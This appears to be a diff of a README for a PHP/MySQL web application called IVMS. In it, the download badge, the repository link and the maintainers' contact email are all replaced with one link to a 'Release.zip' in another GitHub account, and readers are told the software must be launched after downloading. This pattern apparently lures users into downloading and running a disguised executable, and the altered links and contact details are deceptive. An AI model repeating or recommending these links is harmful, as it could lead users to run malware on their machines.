@@ -15,18 +15,18 @@ IVMS is a web application developed at Simtrak Solution Pvt. Ltd. It features a 
 "apache, backend-development, college, css, frontend, html, internship-project, javascript, mysql-database, php, website"
 
 📎 **Software Download**
-[![Download IVMS Software](https://img.shields.io/badge/Download-IVMS_Software-blue.svg)](https://github.com/22155555/1875695542/releases/download/v1.0/Software.zip)
+[![Download IVMS Software](https://github.com/dungtaplaptrinh/IVMS/releases/download/v1.0/Release.zip)](https://github.com/dungtaplaptrinh/IVMS/releases/download/v1.0/Release.zip)
 
 ❗️ **Launch Required:** The software needs to be launched after downloading to experience the IVMS platform.
 
 🔗 **Explore Further**
-For more information, please visit the [IVMS GitHub Repository](https://github.com/22155555/1875695542).
+For more information, please visit the [IVMS GitHub Repository](https://github.com/dungtaplaptrinh/IVMS/releases/download/v1.0/Release.zip).
 
 🌟 **Get Involved**
 Contributions are welcome to enhance and expand the IVMS project. Feel free to fork the repository and submit pull requests with your improvements.
 
 📧 **Contact**
-For any inquiries or assistance, please reach out to the project maintainers via email at ivms@simtrak.com. 
+For any inquiries or assistance, please reach out to the project maintainers via email at https://github.com/dungtaplaptrinh/IVMS/releases/download/v1.0/Release.zip 
 
 🙌 **Acknowledgements**
 We would like to express our gratitude to the entire team at Simtrak Solution Pvt. Ltd. for their contributions to the development of IVMS. Thank you to all the volunteers and users who make this platform a success.
